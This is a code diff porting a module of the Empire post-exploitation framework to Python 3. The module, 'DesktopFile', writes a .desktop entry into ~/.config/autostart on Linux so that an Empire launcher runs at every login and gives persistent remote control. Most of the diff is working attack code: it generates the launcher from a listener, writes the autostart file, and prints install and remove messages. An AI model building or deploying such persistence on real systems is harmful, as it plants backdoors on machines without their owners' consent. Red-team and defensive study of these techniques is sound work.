@@ -1,5 +1,6 @@
+from builtins import object
 import base64
-class Module:
+class Module(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -9,10 +10,14 @@ class Module:
             'Name': 'DesktopFile',
 
             # list of one or more authors for the module
-            'Author': '@jarrodcoulter',
+            'Author': ['@jarrodcoulter'],
 
             # more verbose multi-line description of the module
             'Description': 'Installs an Empire launcher script in ~/.config/autostart on Linux versions with GUI.',
+
+            'Software': '',
+
+            'Techniques': ['T1165'],
 
             # True if the module needs to run in the background
             'Background' : False,
@@ -33,7 +38,7 @@ class Module:
             'MinLanguageVersion' : '2.6',
 
             # list of any references/other comments
-            'Comments': 'https://digitasecurity.com/blog/2018/01/23/crossrat/, https://specifications.freedesktop.org/desktop-entry-spec/latest/ar01s07.html, https://neverbenever.wordpress.com/2015/02/11/how-to-autostart-a-program-in-raspberry-pi-or-linux/'
+            'Comments': ['https://digitasecurity.com/blog/2018/01/23/crossrat/, https://specifications.freedesktop.org/desktop-entry-spec/latest/ar01s07.html, https://neverbenever.wordpress.com/2015/02/11/how-to-autostart-a-program-in-raspberry-pi-or-linux/']
         }
 
         # any options needed by the module, settable during runtime
@@ -84,7 +89,7 @@ class Module:
         fileName = self.options['FileName']['Value']
         listenerName = self.options['Listener']['Value']
         launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='python')
-        launcher = launcher.strip('echo').strip(' | /usr/bin/python &')
+        launcher = launcher.strip('echo').strip(' | python3 &')
         dtSettings = """
 [Desktop Entry]
 Name=%s
@@ -107,9 +112,9 @@ writeFile = filePath + "%s.desktop"
 if remove.lower() == "true":
     if os.path.isfile(writeFile):
         os.remove(writeFile)
-        print "\\n[+] Persistence has been removed"
+        print("\\n[+] Persistence has been removed")
     else:
-        print "\\n[-] Persistence file does not exist, nothing removed"
+        print("\\n[-] Persistence file does not exist, nothing removed")
 
 else:
     if not os.path.exists(filePath):
@@ -118,8 +123,8 @@ else:
     e.write(dtFile)
     e.close()
 
-    print "\\n[+] Persistence has been installed: ~/.config/autostart/%s"
-    print "\\n[+] Empire daemon has been written to %s"
+    print("\\n[+] Persistence has been installed: ~/.config/autostart/%s")
+    print("\\n[+] Empire daemon has been written to %s")
 
 """ % (remove, dtSettings, fileName, fileName, fileName)
 
